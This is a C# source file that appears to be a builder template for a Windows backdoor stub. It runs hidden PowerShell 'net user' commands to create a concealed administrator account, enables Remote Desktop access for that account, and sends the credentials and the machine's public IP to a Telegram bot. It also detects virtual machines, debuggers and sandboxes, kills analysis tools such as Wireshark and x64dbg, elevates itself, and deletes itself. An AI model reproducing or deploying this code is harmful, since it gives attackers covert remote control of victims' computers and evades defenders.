// Main Functions: AntiAnalysis, AntiAnyRun, Mutex, Melt, RunAsAdmin
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Runtime.CompilerServices;
using System.Reflection;

#if UseAssembly
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace GOAT
{
    internal class LuxuryCode
    {
        private static void Main()
        {
            Thread.Sleep(5000);
            ApplicationController.Run();
        }
    }

    internal static class ApplicationController
    {
        public static void Run()
        {
            try
            {

#if RunAsAdmin
            if (!AdminRightsService.IsAdmin())
            {
                AdminRightsService.RestartAsAdmin();
                Environment.Exit(0);
            }
#endif

#if AntiAnalysis || AntiAnyRun || Mutex
                ProtectionService.ExecuteProtection();
#endif
                RdpService.ConfigureRdp();
            }
            catch { }
            finally
            {
#if Melt
                UtilityService.SelfDelete();
#else
                Environment.Exit(0);
#endif
            }
        }
    }

#if AntiAnyRun || AntiAnalysis || Mutex
    internal static class ProtectionService
    {
        public static void ExecuteProtection()
        {
#if AntiAnalysis
            new Thread(AntiAnalysisService.PerformAntiAnalysis).Start();
            Thread.Sleep(3500);
#endif

#if AntiAnyRun

            if (AntiAnalysisService.DetectAnyRunEnvironment())
            {
                Environment.FailFast(null);
            }
#endif

#if Mutex
            MutexControl.EnsureSingleInstance();
#endif
        }
    }
#endif

    internal static class RdpService
    {
        public static void ConfigureRdp()
        {
            RdpConfiguration.CreateAdminUser();
            RdpConfiguration.EnableRemoteDesktopAccess();
            NotificationService.SendRdpNotification();
        }
    }

#if AntiAnalysis || AntiAnyRun
    internal static class AntiAnalysisService
    {
#if AntiAnalysis
        public static void PerformAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
            {
                Environment.FailFast(null);
            }

            while (true)
            {
                MonitorProcesses();
                Thread.Sleep(10);
            }
        }

        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string model = item["Model"].ToString();

                    if ((manufacturer.Contains("microsoft") && model.Contains("VIRTUAL")) ||
                        manufacturer.Contains("vmware") ||
                        model.Contains("VirtualBox"))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            return GetModuleHandle("SbieDll.dll") != IntPtr.Zero;
        }

        private static void MonitorProcesses()
        {
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (ProcessName.Contains(process.ProcessName))
                        process.Kill();
                }
                catch { }
            }
        }

        private readonly static List<string> ProcessName = new List<string>
        {"dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
        "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
        "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
        "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
        "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
        "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
        "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
        "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
        "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
        "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", };

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
#endif

#if AntiAnyRun
        public static bool DetectAnyRunEnvironment()
        {
            string[] requiredFiles =
            {
                "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk",
                "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk"
            };

            foreach (string fileName in requiredFiles)
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory), fileName);
                if (!File.Exists(filePath))
                {
                    return false;
                }
            }

            return Environment.UserName.Equals("admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC");
        }
#endif
    }


#endif

    internal static class RdpConfiguration
    {
        public static void CreateAdminUser()
        {
            UtilityService.ExecutePowerShellCommand("net user " + Configuration.RdpUsername + " " + Configuration.RdpPassword + " /add");
            UtilityService.ExecutePowerShellCommand("net localgroup Administrators " + Configuration.RdpUsername + " /add");
        }

        public static void EnableRemoteDesktopAccess()
        {
            UtilityService.ExecutePowerShellCommand("net localgroup \"Remote Desktop Users\" " + Configuration.RdpUsername + " /add");
        }

    }

    internal static class NotificationService
    {
        public static void SendRdpNotification()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768;
            string systemRam = UtilityService.GetTotalRam();
            string publicIp = UtilityService.GetPublicIp("https://api.ipify.org/");

            string message = "[RDP LOG]\nUser: " + Configuration.RdpUsername +
                             "\nPass: " + Configuration.RdpPassword +
                             "\nIP: " + publicIp +
                             "\nRAM: " + systemRam;

            using (var client = new WebClient())
            {
                client.DownloadString("https://api.telegram.org/bot" + Configuration.TelegramToken +
                                      "/sendMessage?chat_id=" + Configuration.TelegramChatId +
                                      "&text=" + WebUtility.HtmlEncode(message));
            }
        }
    }

#if Mutex
    internal static class MutexControl
    {
        public static void EnsureSingleInstance()
        {
            const string MutexRegistryKey = "SOFTWARE\\%MUTEX_VALUE%";

            if (MutexExists(MutexRegistryKey))
            {
                Environment.FailFast(null);
            }

            CreateMutex(MutexRegistryKey);
        }

        private static bool MutexExists(string registryKeyPath)
        {
            using (var registryKey = Registry.CurrentUser.OpenSubKey(registryKeyPath))
            {
                return registryKey != null;
            }
        }

        private static void CreateMutex(string registryKeyPath)
        {
            Registry.CurrentUser.CreateSubKey(registryKeyPath);
        }
    }
#endif

#if RunAsAdmin
    internal static class AdminRightsService
    {
        public static bool IsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void RestartAsAdmin()
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = Configuration.AppPath,
                UseShellExecute = true,
                Verb = "runas"
            };

            try
            {
                Process.Start(processInfo);
            }
            catch
            {
                // Ignore exceptions
            }
        }
    }
#endif

    internal static class UtilityService
    {
        public static void ExecutePowerShellCommand(string command)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = command,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };

            process.Start();
            process.WaitForExit();
        }

        public static string GetTotalRam()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        double totalMemory = Convert.ToDouble(obj["TotalPhysicalMemory"]);
                        int memoryInMB = (int)(totalMemory / 1048576);
                        return memoryInMB.ToString("N0") + " MB";


                    }
                }
            }
            catch
            {
                return "Unknown";
            }

            return "Unknown";
        }

        public static string GetPublicIp(string uri)
        {
            using (var client = new WebClient())
            {
                return client.DownloadString(uri);
            }
        }

#if Melt
        public static void SelfDelete()
        {
            var fileName = Configuration.AppPath;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = "/c timeout /t 1 && DEL /f " + currentProcessFileName;
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
#endif
    }

    internal static class Configuration
    {
        public const string TelegramToken = "%TOKEN_BOT%";
        public const string TelegramChatId = "%CHATID%";
        public const string RdpUsername = "%RDP_USER%";
        public const string RdpPassword = "%RDP_PASS%";
#if RunAsAdmin || Melt
        public static string AppPath = Process.GetCurrentProcess().MainModule.FileName;
#endif
    }
}
